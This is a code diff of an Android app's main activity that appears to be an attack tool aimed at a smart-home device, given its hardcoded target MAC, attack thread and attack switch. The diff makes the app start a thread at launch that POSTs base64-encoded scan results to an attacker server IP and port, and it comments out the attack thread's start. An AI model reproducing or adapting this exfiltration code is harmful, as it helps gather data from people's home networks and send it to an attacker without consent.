@@ -19,7 +19,7 @@ public class MainActivity extends AppCompatActivity implements ThreadCompleteLis
     private HomeDeviceInfo mGHDInfo;
     public static String OurHomeMac = "F4:F5:D8:C1:B9:2E";
     private String mGHDIP = "";
-    private String mScanResults;
+    private String mScanResults = "test";
     private NotifyingThread mAttackThread;
     private NotifyingThread mSendServerThread;
     private String AttackThreadLabel = "attack_thread";
@@ -38,7 +38,8 @@ public class MainActivity extends AppCompatActivity implements ThreadCompleteLis
         //set default attack mode false
         mAttackSwitch.setChecked(false);
 
-        //Attack Thread
+        init_sendserver();
+        mSendServerThread.start();
 
         //response to attack switch
         mAttackSwitch.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
@@ -49,7 +50,7 @@ public class MainActivity extends AppCompatActivity implements ThreadCompleteLis
                     mSwitchText.setTextColor(getResources().getColor(R.color.colorAccent));
                     initilize_attackthread();
                     mAttackThread.addListener(MainActivity.this);
-                    mAttackThread.start();
+//                    mAttackThread.start();
 
                 }else{
                     mSwitchText.setText("Attack is off");
@@ -92,14 +93,17 @@ public class MainActivity extends AppCompatActivity implements ThreadCompleteLis
                         URL url = new URL("http://" + mAttackerServerIP + ":" + mAttackerServerPort);
                         DataOutputStream printout;
                         HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
-//                        urlConnection.setDoInput (true);
+                        urlConnection.setRequestMethod("POST");
+                        urlConnection.setDoInput (true);
                         urlConnection.setDoOutput (true);
                         urlConnection.setUseCaches (false);
-                        urlConnection.connect();
-                        printout = new DataOutputStream(urlConnection.getOutputStream());
                         byte[] data = mScanResults.getBytes("UTF-8");
                         String base64_data = Base64.encodeToString(data, Base64.DEFAULT);
-                        printout.writeBytes(base64_data);
+                        byte[] base64_databytes = base64_data.getBytes();
+                        urlConnection.setFixedLengthStreamingMode(base64_databytes.length);
+                        urlConnection.connect();
+                        printout = new DataOutputStream(urlConnection.getOutputStream());
+                        printout.write(base64_databytes);
                         printout.flush ();
                         printout.close ();
                         urlConnection.disconnect();
